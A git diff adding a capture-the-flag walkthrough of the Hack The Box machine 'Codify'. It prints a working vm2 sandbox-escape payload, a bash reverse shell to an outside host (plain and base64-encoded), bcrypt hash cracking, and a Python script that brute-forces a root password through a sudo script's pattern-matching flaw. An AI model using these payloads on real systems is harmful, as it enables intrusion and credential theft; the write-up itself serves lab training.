@@ -5,13 +5,14 @@ difficulty: easy
 os: linux
 releaseDate: 2023-11-04
 slug: "codify"
-isPublished: false
+isPublished: true
 ---
 
 import Browser from "@/components/Browser.astro" 
 
 ## Enumeration
 
+We start by enumerating the ports that are open with nmap
 
 [(command explanation)]()
 ```bash
@@ -22,6 +23,7 @@ PORT   STATE SERVICE REASON
 80/tcp open  http    syn-ack ttl 63
 ```
 
+then, we perform a scan by applying the default nmap scripts to the open ports.
 
 [(command explanation)]()
 ```bash
@@ -38,6 +40,8 @@ PORT   STATE SERVICE VERSION
 Service Info: Host: codify.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```
 
+as the machine redirects us to the domain `codify.htb` we add this domain name to our `/etc/hosts` file
+
 ```bash
 echo "10.10.11.239 codify.htb" | sudo tee -a /etc/hosts
 ```
@@ -46,3 +50,205 @@ echo "10.10.11.239 codify.htb" | sudo tee -a /etc/hosts
   src="/walkthroughs/codify/0.png"
   url="codify.htb"
 />
+
+## Exploitation
+
+Within this web we find 3 links or categories:
+- about: in the about section he tells us that he uses vm2 with module or packet filtering.
+- limitations: counts which packages or libraries are being filtered out
+- editor: section where we can test the rce
+
+Searching on the internet for `vm2 exploit` or `vm2 vulnerability` we found a [link](https://github.com/advisories/GHSA-cchq-frgv-rjh5) that explains how to escape the sandbox to obtain remote code execution (RCE) and at the same time we found out that the CVE associated to such vulnerability is [CVE-2023-37466](https://www.incibe.es/incibe-cert/alerta-temprana/vulnerabilidades/cve-2023-37466). When testing the PoC mentioned in that [link](https://gist.github.com/leesh3288/f693061e6523c97274ad5298eb2c74e9), I failed to obtain the RCE. Therefore, I decided to try the one I found on another [site](https://vk9-sec.com/cve-2023-30547exploitation-node-js-vm2-module-code-execution-rce/), which finally allowed me to obtain the RCE.
+
+```js
+err = {};
+const handler = {
+  getPrototypeOf(target) {
+    (function stack() {
+      new Error().stack;
+      stack();
+    })();
+  }
+};
+
+const proxiedErr = new Proxy(err, handler);
+try {
+  throw proxiedErr;
+} catch ({constructor: c}) {
+  c.constructor('return process')().mainModule.require('child_process').execSync('<command>'); // replace <command> with your OS command
+}
+```
+
+```js
+const { VM } = require("vm2");
+
+const vm = new VM();
+const code = ``; // you must put between the quotation marks the code of the previous block.
+console.log(vm.run(code));
+```
+
+Playing a little with the previous code we managed to find out the following system information
+
+|                     |                    |
+| ------------------- | ------------------ |
+| whoami              | svc                | 
+| hostname            | codify             | 
+| shell               | /bin/bash          |
+| python3             | /usr/bin/python3   |
+| nc                  | /usr/bin/nc        |
+| kernel version      | 5.15.0-88-generic  |
+| system architecture | x86_64             |
+| os                  | Ubuntu 22.04.3 LTS | 
+| codename            | jammy              | 
+
+We establish the listening on port 5000 and launch our revershell created with this [website](https://www.revshells.com/)
+
+```bash
+bash -i >& /dev/tcp/10.10.14.70/5000 0>&1
+```
+
+Since the command fails when typed as described in the previous block, we will write it in this other form, in base 64 so when decoded it will be interpreted by bash
+
+```bash
+echo "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC43MC81MDAwIDA+JjE=" | base64 -d | bash
+```
+
+this is the netcat listener that we must have running before executing the previous command to be able to receive the connection from our revershell
+
+```bash
+nc -lvnp 5000
+```
+
+Searching through the directories we found that in `/var/www/contact` we found a file named `tickets.db` that contains the hash of the password of the user joshua
+
+```bash
+svc@codify:/var/www/contact$ strings tickets.db
+
+strings tickets.db
+SQLite format 3
+otableticketstickets
+CREATE TABLE tickets (id INTEGER PRIMARY KEY AUTOINCREMENT, name TEXT, topic TEXT, description TEXT, status TEXT)P
+Ytablesqlite_sequencesqlite_sequence
+CREATE TABLE sqlite_sequence(name,seq)
+	tableusersusers
+CREATE TABLE users (
+        id INTEGER PRIMARY KEY AUTOINCREMENT, 
+        username TEXT UNIQUE, 
+        password TEXT
+    ))
+indexsqlite_autoindex_users_1users
+joshua$2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2
+joshua
+users
+tickets
+Joe WilliamsLocal setup?I use this site lot of the time. Is it possible to set this up locally? Like instead of coming to this site, can I download this and set it up in my own computer? A feature like that would be nice.open
+Tom HanksNeed networking modulesI think it would be better if you can implement a way to handle network-based stuff. Would help me out a lot. Thanks!open
+```
+
+here are 2 commands, 1 with [John](https://www.openwall.com/john/) and the other with [Hashcat](https://hashcat.net/hashcat/) to crack the hash
+
+```bash
+john --format=bcrypt -w=/usr/share/wordlists/rockyou.txt hash.txt
+
+spongebob1
+```
+
+```bash
+hashcat -m 3200 -a 0 -O -d 1  hash.txt /usr/share/wordlists/rockyou.txt
+
+$2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2:spongebob1
+```
+
+Finally we obtain the credentials `joshua:spongebob1`. We access by ssh and get the user flag.
+
+```bash
+joshua@codify:~$ cat user.txt
+1ba70b6408985757822776ff529e11f6
+```
+
+## Privilege escalation
+
+With the following command, we list the possibilities that our user has to be able to execute scripts as superuser.
+
+```bash
+sudo -l
+
+Matching Defaults entries for joshua on codify:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+
+User joshua may run the following commands on codify:
+    (root) /opt/scripts/mysql-backup.sh
+```
+
+we open the script `/opt/scripts/mysql-backup.sh` and after inspecting it, it seems that it is not doing a good credential check allowing us to infer the password.
+
+```bash
+#!/bin/bash
+DB_USER="root"
+DB_PASS=$(/usr/bin/cat /root/.creds)
+BACKUP_DIR="/var/backups/mysql"
+
+read -s -p "Enter MySQL password for $DB_USER: " USER_PASS
+/usr/bin/echo
+
+if [[ $DB_PASS == $USER_PASS ]]; then
+  /usr/bin/echo "Password confirmed!"
+else
+  /usr/bin/echo "Password confirmation failed!"
+  exit 1
+fi
+
+/usr/bin/mkdir -p "$BACKUP_DIR"
+
+databases=$(/usr/bin/mysql -u "$DB_USER" -h 0.0.0.0 -P 3306 -p"$DB_PASS" -e "SHOW DATABASES;" | /usr/bin/grep -Ev "(Database|information_schema|performance_schema)")
+
+for db in $databases; do
+  /usr/bin/echo "Backing up database: $db"
+  /usr/bin/mysqldump --force -u "$DB_USER" -h 0.0.0.0 -P 3306 -p"$DB_PASS" "$db" | /usr/bin/gzip > "$BACKUP_DIR/$db.sql.gz"
+done
+
+/usr/bin/echo "All databases backed up successfully!"
+/usr/bin/echo "Changing the permissions"
+/usr/bin/chown root:sys-adm "$BACKUP_DIR"
+/usr/bin/chmod 774 -R "$BACKUP_DIR"
+/usr/bin/echo 'Done!'
+```
+
+The problem lies in the fact that we are allowed to perform Pattern Matching allowing us to perform brute force to end up inferring the password. In order to obtain the password, we will use this python script that someone left on the machine. (I have slightly modified it)
+
+```python
+import string
+import subprocess
+
+def check_password(p):
+  """executes the script with the password applying pattern matching returning a boolean if it belongs or not to the password."""
+	command = f"echo '{p}*' | sudo /opt/scripts/mysql-backup.sh"
+	result = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
+	return "Password confirmed!" in result.stdout
+
+# charset = string with all letters and numbers
+charset = string.ascii_letters + string.digits
+password = ""
+is_password_found = False
+
+while not is_password_found:
+	for char in charset:
+		if check_password(password + char):
+			password += char
+			break
+	else:
+		is_password_found = True
+
+print(password)
+```
+
+once we have the password `kljh12k3jhaskjh12kjh3`, we change the user to root
+
+```bash
+su root -
+```
+
+```bash
+root@codify:/root# cat root.txt
+bfb5c86d8eedc66d25b28fdaa74b793e
+```
